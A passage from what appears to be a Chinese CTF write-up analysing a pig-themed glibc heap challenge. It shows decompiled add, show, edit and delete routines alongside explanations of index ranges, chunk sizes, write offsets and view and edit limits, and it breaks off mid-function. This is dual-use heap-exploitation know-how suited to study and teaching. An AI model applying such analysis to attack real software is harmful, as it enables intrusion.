class="keyword">if</span> ( i == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v11 = <span class="built_in">calloc</span>(<span class="number">1uLL</span>, <span class="number">0xE8</span>uLL);</span><br><span class="line">        v5 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;01dwang&#x27;s Gift:&quot;</span>);</span><br><span class="line">        std::ostream::<span class="keyword">operator</span>&lt;&lt;(v5, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">        <span class="built_in">read_n</span>(v11, <span class="number">0xE8</span>LL);</span><br><span class="line">        v6 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">        std::ostream::<span class="keyword">operator</span>&lt;&lt;(v6, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error size!&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v12;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>添加操作一共有三种，分别对应猪A，猪B，猪C。猪A可以遍历 <code>0~19</code> 的索引，并添加一个大小在 <code>0x90~0x430</code> 的 <code>chunk</code>，猪B 只能遍历 <code>0~9</code> 的索引，并添加大小在 <code>0x90~0x450</code> 的 <code>chunk</code>。对于猪C，则是 <code>0~4</code> 的索引和 <code>0x90~0x440</code> 的 <code>chunk</code>。猪A, 猪B分配的<code>chunk</code>大小只能一次比一次大或者本次与上一次相等，但猪C没有这个限制。另外，在猪C函数中如果添加 <code>chunk</code> 的索引为 <code>4</code>，则还可以再分配一个大小为<code>0xE8</code>的<code>chunk</code>并写入最大长度为<code>0xE8</code>的内容。 3只猪在<code>add</code>之后可以立即向新分配的<code>chunk</code>中写入内容，但不是<code>chunk</code>中任何位置都能写，<code>chunk</code>空间以<code>48</code>字节为大小分组。对于猪A，每一组48字节空间只能写前面16字节，对于猪B则是只能写中间16字节，对于猪C只能写后面<code>16</code>字节。在写入后，会设置两个标志位为0。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">show</span><span class="params">(Info *info, <span class="type">int</span> id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( state-&gt;show_times &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;No view for you...&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( id )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">show_1</span>(info);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">show_2</span>(info);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">show_3</span>(info);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    --state-&gt;show_times;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">show_1</span><span class="params">(Info *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> index; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the message index: &quot;</span>);</span><br><span class="line">  index = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; <span class="number">20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1-&gt;ptr[index] &amp;&amp; a1-&gt;size[index] &amp;&amp; !a1-&gt;flag1[index] )</span><br><span class="line">    &#123;</span><br><span class="line">      std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;The message is: &quot;</span>);</span><br><span class="line">      v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, a1-&gt;ptr[index]);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error index!&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">show_2</span><span class="params">(Info *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> index; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the message index: &quot;</span>);</span><br><span class="line">  index = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1-&gt;ptr[index] &amp;&amp; a1-&gt;size[index] &amp;&amp; !a1-&gt;flag1[index] )</span><br><span class="line">    &#123;</span><br><span class="line">      std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;The message is: &quot;</span>);</span><br><span class="line">      v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, a1-&gt;ptr[index]);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error index!&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">show_3</span><span class="params">(Info *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> index; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the message index: &quot;</span>);</span><br><span class="line">  index = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1-&gt;ptr[index] &amp;&amp; a1-&gt;size[index] &amp;&amp; !a1-&gt;flag1[index] )</span><br><span class="line">    &#123;</span><br><span class="line">      std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;The message is: &quot;</span>);</span><br><span class="line">      v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, a1-&gt;ptr[index]);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error index!&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>3只猪可以查看的索引范围和可以<code>add</code>的索引范围相同。而且查看时需要有一个标志位为0。这个标志位是<code>add</code>中设置的两个标志位中的第一个。本题限制<code>view</code>的次数最多为2次。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">edit</span><span class="params">(Info *info, <span class="type">int</span> id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( state-&gt;edit_times &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;No edit for you...&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( id )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">edit_1</span>(info);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">edit_2</span>(info);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">edit_3</span>(info);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    --state-&gt;edit_times;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">edit_1</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> index; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the message index: &quot;</span>);</span><br><span class="line">  index = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; <span class="number">20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( info-&gt;ptr[index] &amp;&amp; info-&gt;size[index] &amp;&amp; !info-&gt;flag1[index] )</span><br><span class="line">    &#123;</span><br><span class="line">      std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the Peppa&#x27;s message: &quot;</span>);</span><br><span class="line">      v6 = info-&gt;size[index] / <span class="number">0x30</span>;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v6 &amp;&amp; !(<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">read_n</span>(&amp;info-&gt;ptr[index][<span class="number">0x30</span> * i], <span class="number">0x10</span>LL); ++i )</span><br><span class="line">        ;</span><br><span class="line">      v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error index!&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">edit_2</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> index; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the message index: &quot;</span>);</span><br><span class="line">  index = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( info-&gt;ptr[index] &amp;&amp; info-&gt;size[index] &amp;&amp; !info-&gt;flag1[index] )</span><br><span class="line">    &#123;</span><br><span class="line">      std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the Mummy&#x27;s message: &quot;</span>);</span><br><span class="line">      v6 = info-&gt;size[index] / <span class="number">0x30</span>;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v6 &amp;&amp; !(<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">read_n</span>(&amp;info-&gt;ptr[index][<span class="number">0x30</span> * i + <span class="number">0x10</span>], <span class="number">0x10</span>LL); ++i )</span><br><span class="line">        ;</span><br><span class="line">      v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error index!&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">edit_3</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> index; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the message index: &quot;</span>);</span><br><span class="line">  index = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( info-&gt;ptr[index] &amp;&amp; info-&gt;size[index] &amp;&amp; !info-&gt;flag1[index] )</span><br><span class="line">    &#123;</span><br><span class="line">      std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the Daddy&#x27;s message: &quot;</span>);</span><br><span class="line">      v6 = info-&gt;size[index] / <span class="number">0x30</span>;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v6 &amp;&amp; !(<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">read_n</span>(&amp;info-&gt;ptr[index][<span class="number">0x30</span> * i + <span class="number">0x20</span>], <span class="number">0x10</span>LL); ++i )</span><br><span class="line">        ;</span><br><span class="line">      v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error index!&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>3只猪可以修改的索引范围和可以<code>add</code>的索引范围相同。而且修改时需要有一个标志位为0。这个标志位和<code>view message</code>的标志位相同。本题限制<code>edit</code>的次数最多为8次。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">delete</span><span class="params">(Info *info, <span class="type">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      <span class="built_in">delete_1</span>(info);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      <span class="built_in">delete_2</span>(info);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      <span class="built_in">delete_3</span>(info);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">delete_1</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> num; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the message index: &quot;</span>);</span><br><span class="line">  num = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( num &lt; <span class="number">0x14</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( info-&gt;ptr[num] &amp;&amp; !info-&gt;flag1[num] &amp;&amp; !info-&gt;flag2[num] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(info-&gt;ptr[num]);</span><br><span class="line">      info-&gt;flag1[num] = <span class="number">1</span>;</span><br><span class="line">      info-&gt;flag2[num] = <span class="number">1</span>;</span><br><span class="line">      v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error index!&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">delete_2</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> num; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the message index: &quot;</span>);</span><br><span class="line">  num = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( num &lt; <span class="number">0xA</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( info-&gt;ptr[num] &amp;&amp; !info-&gt;flag1[num] &amp;&amp; !info-&gt;flag2[num] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(info-&gt;ptr[num]);</span><br><span class="line">      info-&gt;flag1[num] = <span class="number">1</span>;</span><br><span class="line">      info-&gt;flag2[num] = <span class="number">1</span>;</span><br><span class="line">      v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error index!&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span 